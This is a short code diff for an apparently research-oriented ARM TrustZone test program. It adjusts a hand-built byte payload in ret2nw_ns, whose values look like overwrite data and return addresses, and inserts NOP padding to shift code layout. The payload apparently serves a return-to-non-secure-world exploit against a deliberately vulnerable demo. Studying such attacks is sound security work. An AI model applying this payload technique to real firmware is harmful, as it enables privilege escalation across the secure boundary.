@@ -61,6 +61,8 @@ void __attribute__((naked)) SVC_Handler(void)
 void print_in_s_handler(char* content)
 {
 	print_nsc(content);
+	__NOP();__NOP();__NOP();__NOP();__NOP();
+	__NOP();__NOP();__NOP();__NOP();
 }
 
 void print_in_s_ns(char* user_str)
@@ -76,19 +78,25 @@ void print_in_s_ns(char* user_str)
 void ret2nw_ns()
 {
 	DROP_NS_PRIVILEGES;
-	char user_input[32] = {
+	char user_input[28] = {
 		0x20,0x20,0x20,0x20,
 		0xc0,0x05,0x00,0x20,
-		0x6f,0x01,0x00,0x00,
+		0x0b,0x01,0x00,0x00,
 		0x22,0x22,0x22,0x22,
 		0x23,0x23,0x23,0x23,
 		0x24,0x24,0x24,0x24,
-		0x32,0x83,0x00,0x00,
-		0x25,0x25,0x25,0x25};
+		0x76,0x83,0x00,0x00};
 	print_in_s_ns(user_input);
 	func_up_ns();
 }
 
+void func_up_ns()
+{
+	while(1)
+	{
+		
+	}
+}
 
 /**
  * \brief BLXNS - IPSR
@@ -119,13 +127,6 @@ void ret2nw_2_ns()
 	func_up_ns();
 }
 
-void func_up_ns()
-{
-	while(1)
-	{
-		
-	}
-}
 
 /* This function is supposed to execute in P */
 int get_driver_status()
